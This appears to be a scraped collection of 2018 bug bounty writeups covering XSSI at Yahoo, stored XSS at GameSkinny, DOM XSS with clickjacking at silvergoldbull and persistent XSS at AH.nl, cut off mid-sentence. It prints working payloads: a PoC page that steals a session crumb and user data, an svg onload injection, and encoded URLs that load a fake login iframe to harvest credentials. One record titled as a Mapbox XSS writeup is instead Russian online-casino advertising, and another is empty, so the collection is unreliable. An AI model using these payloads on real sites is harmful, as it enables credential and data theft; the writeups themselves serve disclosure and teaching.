{"source_url": "https://medium.com/@0xHyde/yahoo-two-xssi-vulnerabilities-chained-to-steal-user-information-750-bounty-e9bc6a41a40a", "title": "Yahoo — Two XSSi vulnerabilities chained to steal user information. ($750 Bounty) | by hyde | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@0xHyde/yahoo-two-xssi-vulnerabilities-chained-to-steal-user-information-750-bounty-e9bc6a41a40a. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nYahoo — Two XSSi vulnerabilities chained to steal user information. ($750 Bounty) | by hyde | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Yahoo — Two XSSi vulnerabilities chained to steal user information. ($750 Bounty) hyde 3 min read · Jul 29, 2018 -- 1 Listen Share While intercepting requests using Burp Suite I noticed the following request: Press enter or click to view image in full size When I saw that this was a JSONP endpoint I immediately knew this could potentially be an XSSi vulnerability. However, I noticed that if the value for the .crumb GET parameter wasn’t valid it would return the following response: Press enter or click to view image in full size At this point I realized that if I could somehow steal the victims valid .crumb value, I could successfully steal information about their account. I then searched all requests I intercepted in Burp Suite for my valid crumb and I quickly found it in in a dynamic Javascript file located at: https://messenger.yahoo.com/embed/app.js If you go to this page now you will not find the logoutCrumb value since they have patched this issue. However, when I initially discovered this issue the file looked like this: Press enter or click to view image in full size Now, for people that don’t understand how XSSi works the vulnerability essentially takes advantage of Same-Origin Policy (SOP) not being applied to Javascript src attribute within the script tag. I then created the following Proof of Concept which steals the valid .crumb value from the dynamic Javascript file at https://messenger.yahoo.com/embed/app.js and then places the valid crumb in the .crumb GET parameter as seen here https://jsapi.login.yahoo.com/w/device_users?.crumb=POR1.kRjsx. which returns a proper response containing information about the user. Using the code below I was able to extract information: <html> <head> <title>Yahoo XSSi PoC</title> </head> <body> <div style=\"width: 60%; margin-right: auto; margin-left: auto; margin-bottom: 30px;\"> <h1 style=\"text-align: center;\">Proof of Concept</h1> <b>Dataset 1:</b> <div id=\"content1\" style=\"width: 100%; border: 1px solid black; padding: 10px; overflow: scroll; font-family: monospace;\"></div> <br/> <b>Dataset 2:</b> <div id=\"content2\" style=\"width: 100%; border: 1px solid black; padding: 10px; overflow: scroll; font-family: monospace;\"></div> </div> <script> function processDeviceUsers(data) { document.getElementById(\"content1\").innerHTML = JSON.stringify(data); } window.onload = function () { var config = {}; config_data = {}; config.merge = function(data) { config_data = data }; iris.initConfig(config); document.getElementById(\"content2\").innerHTML = JSON.stringify(config_data); var src = \"https://jsapi.login.yahoo.com/w/device_users?.crumb=\" + config_data.session.logoutCrumb; var s = document.createElement('script'); s.setAttribute('src', src); document.body.appendChild(s); } </script> <script src=\"https://messenger.yahoo.com/embed/app.js\"></script> <script src=\"https://code.jquery.com/jquery-3.3.1.min.js\"></script> </body> </html> Below is a screenshot of the payload I submitted to Yahoo and received a $750 bug bounty. Overall, I had a great time developing the Proof of Concept for this vulnerability chain and I hope others are able to learn a thing or two from this write up. Press enter or click to view image in full size JavaScript Information Security Web Application Security -- -- 1 Written by hyde 496 followers · 8 following Security Researcher, Programmer, Full Stack Developer, & Businessman. Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@friendly_/stored-xss-in-gameskinny-aa26c6a6ae40", "title": "Stored XSS in GameSkinny. After weeks and weeks of e-mailing… | by Friendly | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@friendly_/stored-xss-in-gameskinny-aa26c6a6ae40. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nStored XSS in GameSkinny. After weeks and weeks of e-mailing… | by Friendly | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Stored XSS in GameSkinny Friendly 2 min read · Aug 3, 2018 -- 1 Listen Share After weeks and weeks of e-mailing GameSkinny and tweeting at them to fix their security issues, they decided to not answer me (I think). That is very unfortunate. I also decided to also remove my tweets towards them as well as it didn’t seem to reach out to them. Today I have decided to release that to the public (full disclosure) as it still works. Steps to Reproduce the stored XSS: Go to: http://gameskinny.com and make an account. Press enter or click to view image in full size Next we visit https://www.gameskinny.com/post/edit to make a thread or article — whichever you prefer to call it. Now we insert our payload: “><svg/onload=alert(1)> ” and it should look a little something like this: Press enter or click to view image in full size After that, scroll to the bottom, then click “ Save your changes ” and click the preview button. …. We get the famous confirm(1) to popup! Press enter or click to view image in full size Gif of the POC: Press enter or click to view image in full size If you wanted to do malicious harm, or grab information that you weren’t suppose to have, then you would use a proper payload. I won’t be sharing that here — SORRY! You can share your drafts with registered users who will be able to see your article and they would see the XSS — or get executed on. You can also send this in to the Editors by clicking “ Send to editors ” and executing an XSS script on them, which would hijack their cookies or sessions to do malicious activity. Once again, this post is NOT meant to do anything harmful to the website. I am just a security researcher who is trying to help secure your website — other websites as well. I hope http://gameskinny.com does fix this issue in the future (hope very soon) to secure their users information. If you have any questions or comments, feel free to message me on Twitter @Skeletorkeys Thanks for reading. Security Xss Attack Xss -- -- 1 Written by Friendly 403 followers · 4 following I am Friendly. Your friendly mid-night exploiter. Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://www.mohamedharon.com/2018/08/mapboxxss.html", "title": "Украинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы", "friendly_explanation": "This is a bug bounty writeup from https://www.mohamedharon.com/2018/08/mapboxxss.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nУкраинские казино онлайн – топовые игры быстрые выплаты и ежедневные бонусы mohamedharon.com Меню Украинские казино онлайн Украинские казино онлайн Онлайн-казино в Украине становятся всё популярнее, и мы не можем не заметить, как быстро этот рынок развивается. С каждым годом появляется всё больше платформ, предлагающих захватывающие игры, щедрые бонусы и удобные способы оплаты. Это отличный способ провести время, испытать удачу и, возможно, сорвать крупный выигрыш. Мы понимаем, что выбор среди множества онлайн-казино может быть непростым. Ведь хочется, чтобы всё было честно, безопасно и увлекательно. Давайте разберёмся, как найти лучшее украинское казино онлайн, на что обратить внимание и какие возможности ждут нас в этом захватывающем мире азартных игр. Лучшие украинские казино онлайн Онлайн-казино в Украине предлагают игрокам широкий выбор качественных платформ. Мы рассмотрим популярные варианты и критерии, которые помогут найти надежное место для игры. Популярные платформы в 2025 году Украинские онлайн-казино уверенно выходят на международный рынок и становятся всё более популярными среди игроков в Эстонии. Они привлекают не только широким выбором игр, но и выгодными условиями для новичков: моментальная регистрация, щедрые приветственные бонусы, ежедневные акции и бесплатные фриспины. Parimatch Casino Быстрая регистрация через электронную почту или социальные сети. Фриспины начисляются после первого депозита. Казино предлагает ежедневные бонусы, кэшбэк и программу лояльности для активных игроков. Favbet Casino Упрощённый процесс создания аккаунта и регулярные турниры. Новые пользователи получают фриспины после подтверждения аккаунта. Бонусная система обновляется постоянно, предлагая свежие акции и розыгрыши. Cosmolot Casino Регистрация занимает менее минуты. Платформа предлагает ежедневные фриспины, бонусы за активность, кэшбэк и адаптивный мобильный интерфейс. Программа лояльности настраивается под индивидуальный стиль игры. Slotoking Casino Бездепозитные фриспины сразу после регистрации и быстрый старт. Казино предлагает регулярные акции, обновление игровых автоматов и оперативное выведение выигрышей — именно это ценят игроки в Эстонии. First Casino Бесплатные фриспины доступны уже на этапе регистрации или первого входа. Казино проводит ежедневные промо, турниры и предоставляет интуитивно понятный интерфейс, особенно удобный для новичков. Мы видим, что у операторов увеличивается акцент на мобильные приложения. Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции. Платформы предлагают приветственные бонусы, фриспины и программы лояльности, привлекая новых игроков. Отзывы и репутация. Реальные отзывы помогают оценить качество сервиса. Техподдержка. Круглосуточная поддержка делает игру комфортной и безопасной. При выборе платформы стоит проверить каждый критерий, чтобы получить максимально позитивный опыт. Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах. Cosmolot, например, известен ежедневными бонусами, а Slotoking продвигает систему кэшбэка. Эти предложения увеличивают шансы на выигрыш и повышают интерес пользователей. Методы платежей в украинских казино онлайн Онлайн-казино в Украине предлагают широкий выбор методов оплаты, чтобы удовлетворить запросы пользователей. Рассмотрим самые популярные варианты и их особенности. Популярные способы депозитов и выводов Мы отмечаем, что самые востребованные методы оплаты включают банковские карты Visa и Mastercard, которые обеспечивают надежность и быстроту транзакций. Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь. Итог Украинские онлайн-казино продолжают радовать нас своим разнообразием, удобством и безопасностью. Благодаря лицензированию, современным технологиям и широкому выбору игр, каждый игрок может найти платформу, которая идеально соответствует его предпочтениям. Мы уверены, что осознанный подход к выбору казино и соблюдение простых рекомендаций помогут вам наслаждаться игрой, избегая неприятных ситуаций. Не забывайте об ответственности и играйте для удовольствия, а не ради риска. Пусть ваш опыт в украинских онлайн-казино будет захватывающим, а удача всегда на вашей стороне! Часто задаваемые вопросы Какие критерии важны при выборе онлайн-казино в Украине? Для выбора надежного онлайн-казино обратите внимание на наличие лицензии, разнообразие игр, методы оплаты, бонусные программы, репутацию и отзывчивость технической поддержки. Проверка этих параметров гарантирует честность, безопасность и комфортный игровой опыт. Какие казино популярны в Украине в 2023 году? Особой популярностью пользуются Cosmolot, Parimatch, JacobCasino и Slotoking. Эти платформы предлагают широкий выбор игр, бонусы и удобный пользовательский интерфейс. Какие способы оплаты доступны в украинских онлайн-казино? Часто используются Visa, Mastercard, Monobank, Приват24, Qiwi, криптовалюты (Bitcoin, Ethereum) и мобильные платежи. Время зачисления депозита обычно мгновенное, а вывод средств может занять от 1 до 3 рабочих дней. Насколько безопасны игры в онлайн-казино? Безопасность обеспечивается лицензированием, шифрованием данных и честными системами генерации случайных чисел. Игрокам рекомендуется выбирать только лицензированные платформы. Какие бонусы можно получить в украинских онлайн-казино? Бонусы включают приветственные пакеты, бесплатные вращения, кешбэк и программы лояльности. Эти акционные предложения увеличивают шансы на выигрыш. Какие риски связаны с игрой в онлайн-казино? Основные риски — это финансовые потери, игровая зависимость и технические проблемы. Для минимизации рисков важно играть осознанно и придерживаться установленного бюджета. Можно ли играть в украинских казино на мобильных устройствах? Да, большинство онлайн-казино предлагают мобильные приложения или адаптированные версии сайта, что позволяет играть в любое время и в любом месте. Как быстро проходят финансовые транзакции в казино? Депозиты обычно зачисляются мгновенно, а вывод средств может занимать от нескольких часов до 3 рабочих дней в зависимости от метода платежа. Как проверить легальность онлайн-казино в Украине? Убедитесь, что казино имеет лицензию от КРАИЛ (Комиссии по регулированию азартных игр и лотерей). Информация о лицензии должна быть указана на официальном сайте казино. Какие ошибки новички допускают при игре в онлайн-казино? Частые ошибки — игнорирование лицензии, ставка больше установленного бюджета, отсутствие стратегии и эмоциональные решения. Избегайте этих ошибок для улучшения игрового опыта. Copyright © 2025 - all rights reserved by mohamedharon.com Прокрутка вверх"}
{"source_url": "https://blog.bentkowski.info/2018/06/xss-in-google-colaboratory-csp-bypass.html", "title": "MB blog: XSS in Google Colaboratory + CSP bypass", "friendly_explanation": "This is a bug bounty writeup from https://blog.bentkowski.info/2018/06/xss-in-google-colaboratory-csp-bypass.html. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nMB blog: XSS in Google Colaboratory + CSP bypass"}
{"source_url": "https://medium.com/@maxon3/reflected-dom-xss-and-clickjacking-on-https-silvergoldbull-de-bt-html-daa36bdf7bf0", "title": "Reflected DOM XSS and CLICKJACKING on https://silvergoldbull.de/bt.html | by Daniel Maksimovic | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@maxon3/reflected-dom-xss-and-clickjacking-on-https-silvergoldbull-de-bt-html-daa36bdf7bf0. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nReflected DOM XSS and CLICKJACKING on https://silvergoldbull.de/bt.html | by Daniel Maksimovic | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication Reflected DOM XSS and CLICKJACKING on https://silvergoldbull.de/bt.html Daniel Maksimovic 5 min read · Sep 13, 2018 -- 3 Listen Share While doing spidering on silvergoldbull site I noticed a strange request to https://silvergoldbull.de/bt.html with following request: https://silvergoldbull.com/bt.html?g=z8iclZHbpNXLzt2YpBXLw9GdtMXdvMXZv02bj5CbsVnYkx2bnJXZ2xWaz9yL6MHc0RHa1 Page redirected to: https://silvergoldbull.com/es/us-top-picks-silver/3 Lets check what is in the source code: var _0x2ad7 = [‘split’, ‘join’, ‘fromCharCode’, ‘length’, ‘ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/’, ‘charAt’, ‘location’, ‘search’, ‘substr’]; (function(_0x1c1079, _0x4030e6) { var _0x37524a = function(_0x43a4b9) { while ( — _0x43a4b9) { _0x1c1079[‘push’](_0x1c1079[‘shift’]()); } }; _0x37524a(++_0x4030e6); }(_0x2ad7, 0x17c)); var _0x11bc = function(_0x4a174f, _0x2b3ed7) { _0x4a174f = _0x4a174f — 0x0; var _0x51adc6 = _0x2ad7[_0x4a174f]; return _0x51adc6; }; b = function(_0x1a02a7) { var _0x4af312 = {}, _0x2b3791, _0x1b21f9 = 0x0, _0x45e157, _0x5eca9b, _0x241abe = 0x0, _0x385668, _0x2ceca8 = ‘’, _0x3299c7 = String[_0x11bc(‘0x0’)], _0x2844f2 = _0x1a02a7[_0x11bc(‘0x1’)]; var _0x5717d2 = _0x11bc(‘0x2’); for (_0x2b3791 = 0x0; _0x2b3791 < 0x40; _0x2b3791++) { _0x4af312[_0x5717d2[_0x11bc(‘0x3’)](_0x2b3791)] = _0x2b3791; } for (_0x5eca9b = 0x0; _0x5eca9b < _0x2844f2; _0x5eca9b++) { _0x45e157 = _0x4af312[_0x1a02a7[_0x11bc(‘0x3’)](_0x5eca9b)]; _0x1b21f9 = (_0x1b21f9 << 0x6) + _0x45e157; _0x241abe += 0x6; while (_0x241abe >= 0x8) { ((_0x385668 = _0x1b21f9 >>> (_0x241abe -= 0x8) & 0xff) || _0x5eca9b < _0x2844f2–0x2) && (_0x2ceca8 += _0x3299c7(_0x385668)); } } return _0x2ceca8; }; var p = new URLSearchParams(window[_0x11bc(‘0x4’)][_0x11bc(‘0x5’)]); var h = p[‘get’](‘g’); var e = h[_0x11bc(‘0x6’)](h[_0x11bc(‘0x1’)] — 0x1); h = h[‘substr’](0x0, h[_0x11bc(‘0x1’)] — 0x1); var eq = Array(parseInt(e) + 0x1)[‘join’](‘=’); var u = b(h[_0x11bc(‘0x7’)](‘’)[‘reverse’]()[_0x11bc(‘0x8’)](‘’) + eq); window.location = u.replace(/[‘“]+/g, ‘’); Script takes the value from the URL and sets it as window.location in the last step. Step by step it looks like this: var p = new URLSearchParams(window[_0x11bc(‘0x4’)][_0x11bc(‘0x5’)]); This var defines new URLSearchParams interface which takes the value of window.location.search as parameter. In this case it is the value of g parameter. So variable p has the value of: ?g=z8iclZHbpNXLzt2YpBXLw9GdtMXdvMXZv02bj5CbsVnYkx2bnJXZ2xWaz9yL6MHc0RHa1 Next: var h = p[‘get’](‘g’); takes the value of g parameter and assign its value to h variable. Variable h has the value of: z8iclZHbpNXLzt2YpBXLw9GdtMXdvMXZv02bj5CbsVnYkx2bnJXZ2xWaz9yL6MHc0RHa1 Next variable e is created: var e = h[_0x11bc(‘0x6’)](h[_0x11bc(‘0x1’)] — 0x1); It does a substring javascript method and takes the last character of the string assigned to h variable, last value of that string is number 1 ( last value must be number, if not there will be an error since parseInt in variable eq takes string and parses it to integer, so the value must be numeric, no letters ) : z8iclZHbpNXLzt2YpBXLw9GdtMXdvMXZv02bj5CbsVnYkx2bnJXZ2xWaz9yL6MHc0RHa[1] Next value h is assigned the value of h without the last character, in this case it is 1. So h has the value of: h = h[‘substr’](0x0, h[_0x11bc(‘0x1’)] — 0x1); z8iclZHbpNXLzt2YpBXLw9GdtMXdvMXZv02bj5CbsVnYkx2bnJXZ2xWaz9yL6MHc0RHa Next variable eq has the value of array with two field and join method adds the value of “=” to array. var eq = Array(parseInt(e) + 0x1)[‘join’](‘=’); So the value inside array and the value variable eq is: = Last step is variable u , there are three things happening here. Value of h is split into array, and then reversed and joined again with value of eq variable added to the end. var u = b(h[_0x11bc(‘0x7’)](‘’)[‘reverse’]()[_0x11bc(‘0x8’)](‘’) + eq); So first we get: h.split(“”); (68) [“z”, “8”, “i”, “c”, “l”, “Z”, “H”, “b”, “p”, “N”, “X”, “L”, “z”, “t”, “2”, “Y”, “p”, “B”, “X”, “L”, “w”, “9”, “G”, “d”, “t”, “M”, “X”, “d”, “v”, “M”, “X”, “Z”, “v”, “0”, “2”, “b”, “j”, “5”, “C”, “b”, “s”, “V”, “n”, “Y”, “k”, “x”, “2”, “b”, “n”, “J”, “X”, “Z”, “2”, “x”, “W”, “a”, “z”, “9”, “y”, “L”, “6”, “M”, “H”, “c”, “0”, “R”, “H”, “a”] And then reverse the values: h.split(“”).reverse(); (68) [“a”, “H”, “R”, “0”, “c”, “H”, “M”, “6”, “L”, “y”, “9”, “z”, “a”, “W”, “x”, “2”, “Z”, “X”, “J”, “n”, “b”, “2”, “x”, “k”, “Y”, “n”, “V”, “s”, “b”, “C”, “5”, “j”, “b”, “2”, “0”, “v”, “Z”, “X”, “M”, “v”, “d”, “X”, “M”, “t”, “d”, “G”, “9”, “w”, “L”, “X”, “B”, “p”, “Y”, “2”, “t”, “z”, “L”, “X”, “N”, “p”, “b”, “H”, “Z”, “l”, “c”, “i”, “8”, “z”] And them join the values and add the value of eq variable: h.split(“”).reverse().join(“”) + eq “aHR0cHM6Ly9zaWx2ZXJnb2xkYnVsbC5jb20vZXMvdXMtdG9wLXBpY2tzLXNpbHZlci8z=” So we get the final falue encoded in BASE64 and the function b does decoding to cleartext and regex inside window.location removes quotes and double quotes. b(“aHR0cHM6Ly9zaWx2ZXJnb2xkYnVsbC5jb20vZXMvdXMtdG9wLXBpY2tzLXNpbHZlci8z=”); “https://silvergoldbull.com/es/us-top-picks-silver/3\" Exploitation time: 1. Simple XSS as simple POC URL: https://silvergoldbull.com/bt.html?g=xETMv8yOpUWar92bj5CduVWb1N2bkhCdyVGbhpDdwlmcjNXY2Fma1 POC: Press enter or click to view image in full size Img 1.0 Page loads in Google Chrome — XSS Auditor bypassed Press enter or click to view image in full size Img 2.0 Page loads in Mozilla Firefox We used vector javascript:alert(document.cookie);//111 to generate BASE64 without equal or plus signs and then we reverse the string and add numeric value to the end: Img 3.0 Base64 encoded XSS vector Img 4.0 Base64 reversed XSS vector But we can’t get the cookies we need cos of HTTPOnly on the cookies, so we need a more advanced attack. Something that will get us data. 2. Stealing user logins with fake login inside Iframe displayed on https://silvergoldbull.com Lets first clone the login page and setup fake https login page: https://maxon3.github.io/silvergold/ Next we have to setup out injection vector, since quotes and double quotes are removed from the vector we have to use something other instead of them, we can use backtics and bypass that. Steps: 1. Set new parameter inside URL request with value of encoded base64 iframe ( secK parameter ) 2. Request value of secK with our javascript injected vector ( injection vector is the value of g parameter ) 3. Page gets rendered and displayed 4. User enters his data and clicks login 5. Attacker has user data and the best thing is URL will still show silvergoldbull Vector used is: https://silvergoldbull.com/bt.html?secK=PGlmcmFtZSBvbmxvYWQ9IndpbmRvdy5zdG9wKCk7InNyYz0nLy9nb28uZ2wvaFE0eFhvJ3N0eWxlPSJoZWlnaHQ6MTAwMHB4O3dpZHRoOjEwMCU7Ym9yZGVyOjAiPg==&g=v8yLvsTKpkCYLNWZzBGKdBGdldGYbBHKi9GdhhSZ0lmc35CduVWb1N2bkpDdwlmcjNXY2Fma1 Explained: Value of g is: var h = “v8yLvsTKpkCYLNWZzBGKdBGdldGYbBHKi9GdhhSZ0lmc35CduVWb1N2bkpDdwlmcjNXY2Fma1”; console.log(atob(h.substr(0,h.length-1).split(“”).reverse().join(“”))); javascript:document.write(atob(p[`get`](`secK`)));//// So we take the value of param secK and decode it with atob function, after decoding is done the value is written inside DOM and rendered. The value of secK is: atob(‘PGlmcmFtZSBvbmxvYWQ9IndpbmRvdy5zdG9wKCk7InNyYz0nLy9nb28uZ2wvaFE0eFhvJ3N0eWxlPSJoZWlnaHQ6MTAwMHB4O3dpZHRoOjEwMCU7Ym9yZGVyOjAiPg==’) <iframe onload=”window.stop();”src=’//goo.gl/hQ4xXo’style=”height:1000px;width:100%;border:0\"> We used google redirector to shorten the base64 vector, removed spaces where we could, removed the border, set iframe to take full value of viewport, and to remove loading spinning animation we set window.stop() to run right after the page has finished loading. POC: Press enter or click to view image in full size Img 5.0 Page loaded on Google Chrome with fake login iframe server from github pages Press enter or click to view image in full size Img 6.0 After user submits the login form we got his data All attacker needs is to share URL and wait for credentials, it is that easy. ClickJacking can also be exploited due to fact that SAMEORIGIN requirements have been satisfied: https://silvergoldbull.com/bt.html?secK=PGlmcmFtZSBvbmxvYWQ9IndpbmRvdy5zdG9wKCk7InNyYz0nLy9nb28uZ2wvdHpiRlI2J3N0eWxlPSJoZWlnaHQ6MTAwMHB4O3dpZHRoOjEwMCU7Ym9yZGVyOjAiPg==&g=v8yLvsTKpkCYLNWZzBGKdBGdldGYbBHKi9GdhhSZ0lmc35CduVWb1N2bkpDdwlmcjNXY2Fma1 Value of secK is : <iframe onload=”window.stop();”src=’//goo.gl/tzbFR6'style=”height:1000px;width:100%;border:0\"> POC: Press enter or click to view image in full size Img 7.0 https://silvergoldbull.com website inside Iframe, ready for ClickJacking Fix: They removed the vulnerable page, but for all of you who want to “practice” and exploit this bug while reading this post, I created a hack.me just for you: https://hack.me/104291/dom-xss-2.html Thanks for reading. JavaScript Xss Attack Security Hacking Bug Bounty -- -- 3 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Daniel Maksimovic 294 followers · 14 following A pentester. A bug bounty hunter. All together that wierd security guy. Responses ( 3 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://medium.com/@jonathanbouman/persistent-xss-at-ah-nl-198fe7b4c781", "title": "Persistent XSS at AH.nl. Bug that allows to steal cookies from… | by Jonathan Bouman | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@jonathanbouman/persistent-xss-at-ah-nl-198fe7b4c781. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nPersistent XSS at AH.nl. Bug that allows to steal cookies from… | by Jonathan Bouman | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Persistent XSS at AH.nl Jonathan Bouman 6 min read · Jul 9, 2018 -- 3 Listen Share Press enter or click to view image in full size tl;dr: server stored xss visible to all visitors Are you aware of any (private) bug bounty programs or platforms? I would love to get an invite. Please get in touch with me: Jonathan@Protozoan.nl Background In the previous blog posts we discussed Reflected XSS bugs at Amazon.com , Unauthorized file uploads at Apple.com and Open redirect bugs at Bol.com These types of attacks need a user to click a specific link in order to run our malicious code. A problem with that is that most browsers block this sort of attacks . But what if we want to inject our code into the website so every visiting user will be targeted? We call this type of attack Persistent- or Stored XSS . A big advantage is that browser can’t easily detect this type of attack, so we don’t have problems with bypassing the XSS auditors. AH.nl Today we will try to find this type of bug at Albert Heijn, the biggest supermarket chain in The Netherlands. Searching for vulnerable pages Persistent means that we have to save our code in the database of the website. This narrows our focus to places where we can register, sign up and create content. A quick look at AH.nl shows us a community website that offers the exchange of recipes, Kookschrift . Everyone can register and after your first submission of a recipe someone at AH.nl will activate and publish your profile. Part of your profile is an avatar, you are allowed to pick one from a predefined list. After clicking the avatar a number will be saved into a hidden form field and it’s all fine. Press enter or click to view image in full size Avatar integer But what if we try something else like… change the number to a string containing our javascript code? Burp Suite to the rescue An easy way to test different payloads is to use burpsuite . You start burpsuite and add it to your browser . From that moment it will intercept all your website requests. This allows you to easily modify parameters, submit new values and evaluate the responses. Press enter or click to view image in full size Intercepted profile edit Use the action button and pick ‘Send to repeater’. After that press the repeater tab and let the magic happen. Press enter or click to view image in full size You are now able to set all sorts of payloads to the different fields, with the result of the submission on the right. Now it’s time to submit your payload, refresh the browser and see if our code results in unexpected behavior. Think of not properly escaped strings, number parameters that are able to hold strings, url strings that are not checked against a whitelist, etc. You are able to automatically brute force this by using tools like burpsuite (attacker tab), but I advice you to do it manually. Otherwise you may trigger firewalls and cause unnecessary load on the website. I save you some time here; almost all the parameters are properly sanitized, except one; the avatarUrl field on the profile edit page. Perfect. That one is used in different places on the website and avatars are also visible on the frontpage; they’ve got a list of ‘New users’ with avatars. Now we only need to create the javascript payload to inject into our avatar field. For this proof of concept it will be enough to arrange an account that is featured on 